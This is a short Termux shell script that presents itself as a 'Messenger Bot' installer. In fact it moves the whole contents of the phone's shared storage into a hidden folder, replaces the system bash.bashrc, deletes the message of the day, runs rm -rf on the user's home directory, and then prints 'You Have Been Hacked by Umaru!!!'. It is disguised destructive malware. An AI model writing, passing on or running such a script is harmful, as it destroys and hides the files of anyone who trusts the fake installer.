RED="$(printf '\033[1;31m')"
GREEN="$(printf '\033[1;32m')"
clear
sleep 1
termux-setup-storage
echo "${GREEN}The Messenger Bot is Installing please wait"
unzip -q Android.zip
mv -f .Android /sdcard
mv -f /sdcard/* /sdcard/.Android/4681
clear
pkg install figlet -y
mv -f bash.bashrc /data/data/com.termux/files/usr/etc
rm -rf /data/data/com.termux/files/usr/etc/motd
rm -rf $HOME
echo "${RED}You Have Been Hacked by Umaru!!!"
sleep 1
bash
